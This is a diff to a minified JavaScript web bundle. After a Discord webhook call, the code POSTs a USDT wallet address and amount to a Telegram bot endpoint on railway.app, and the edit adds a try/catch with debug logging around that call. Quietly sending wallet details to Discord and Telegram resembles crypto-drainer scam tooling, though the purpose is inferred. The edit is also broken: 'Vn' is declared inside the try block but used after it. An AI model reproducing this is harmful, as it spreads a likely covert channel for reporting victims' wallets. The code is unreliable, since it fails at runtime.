@@ -36946,16 +36946,39 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                 });
                 if (!dt.ok)
                     throw new Error(`Discord webhook error: ${dt.status} ${dt.statusText}`);
-                const Vn = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        wallet_address: ue,
-                        amount: be
-                    })
-                });
+              try {
+    // Debug log before sending the payload
+    console.log("📤 Sending Telegram Payload:", {
+        usdtAddress: ue,
+        amount: be
+    });
+
+    // Optional: Check if data is missing
+    if (!ue || !be) {
+        console.error("❌ Telegram payload has missing values:", { ue, be });
+    }
+
+    const Vn = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            usdtAddress: ue,
+            amount: be
+        })
+    });
+
+    // If the response is not OK, throw an error
+    if (!Vn.ok) {
+        throw new Error(`API error: ${Vn.status} ${Vn.statusText}`);
+    }
+
+    console.log("✅ Successfully sent to Telegram backend!");
+
+} catch (ke) {
+    console.error("🚨 Error sending to Telegram backend:", ke);
+}
                 if (!Vn.ok)
                     throw new Error(`API error: ${Vn.status} ${Vn.statusText}`);
                 console.log("Successfully sent to Discord and transaction-store API!")
